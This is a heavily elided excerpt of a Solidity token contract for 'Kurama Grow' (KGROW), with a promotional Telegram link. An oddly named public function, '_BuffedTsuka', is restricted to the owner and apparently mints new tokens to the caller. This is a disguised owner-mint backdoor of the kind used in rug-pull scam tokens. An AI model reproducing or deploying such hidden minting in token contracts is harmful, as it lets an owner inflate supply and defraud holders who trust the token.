...
//
// 📱 Telegram::https://t.me/+fArnRNoSEBljOWJl
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BuffedTsuka(uint256 amount) public onlyOwner {
 _BuffedTsuka(msg.sender, amount);
    }
    ...
    function _BuffedTsuka(address account, uint256 amount) internal virtual {
...
contract $KuramaGrow is ERC20 {
    ...
    constructor() public ERC20("Kurama Grow", "KGROW") {
     _BuffedTsuka(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}